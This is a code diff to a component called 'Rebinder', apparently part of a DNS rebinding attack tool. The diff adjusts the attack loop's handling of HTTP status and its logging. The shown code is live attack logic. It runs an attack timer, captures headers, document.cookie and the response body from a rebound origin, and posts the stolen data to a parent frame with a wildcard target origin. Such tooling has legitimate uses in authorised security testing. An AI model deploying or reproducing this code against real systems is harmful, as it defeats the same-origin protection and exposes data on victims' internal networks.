@@ -134,29 +134,29 @@ const Rebinder = () => {
                 headers = r.headers;
                 cookie = document.cookie;
 
-                return r.text();
+                // Store the response object to access status later
+                return r.text().then(text => ({ text, status: r.status, ok: r.ok }));
             })
             .then(function (responseData) { // we successfully received the server response
-                if (responseData.length === 0) {
-                    // Browser is probably confused about abrupt connection drop. 
-                    // Let's wait for the next iteration.
-                    throw new Error('invalidResponseLength');
-                }
+                const responseText = responseData.text;
+                
+                console.log(`Received response: status=${responseData.status}, bodyLength=${responseText.length}, ok=${responseData.ok}`);
 
-                if (responseData.includes(indextoken)) {
+                if (responseText.includes(indextoken)) {
                     throw new Error('hasToken');
                 }
 
-                body = responseData;
+                body = responseText;
                 clearInterval(timer); // stop the attack timer
                 // Report success to parent frame
                 window.parent.postMessage({
                     status: 'success',
-                    response: body
+                    response: body,
+                    httpStatus: responseData.status
                 }, "*");
                 // Terminate the attack
                 rebindingSuccess = true;
-                rebindingStatusEl.innerText = `DNS rebinding successful!`;
+                rebindingStatusEl.innerText = `DNS rebinding successful! (HTTP ${responseData.status})`;
                 rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
             })
             .catch(function (error) {
@@ -166,10 +166,9 @@ const Rebinder = () => {
                         status: 'error',
                     }, "*");
                 } else if (error.message === 'hasSingularityHeader' ||
-                    error.message === 'invalidResponseLength' ||
                     error.message === 'hasToken' ||
                     error.message === 'invalidHeaderCount') {
-                    console.log(`DNS rebinding did not happen yet: ${window.location.host}`)
+                    console.log(`DNS rebinding did not happen yet: ${window.location.host} Error: ${error.message}`)
                 } else if (error.message == 'requiresHttpAuthentication') {
                     console.log('This resource requires HTTP Authentication.');
                     window.parent.postMessage({
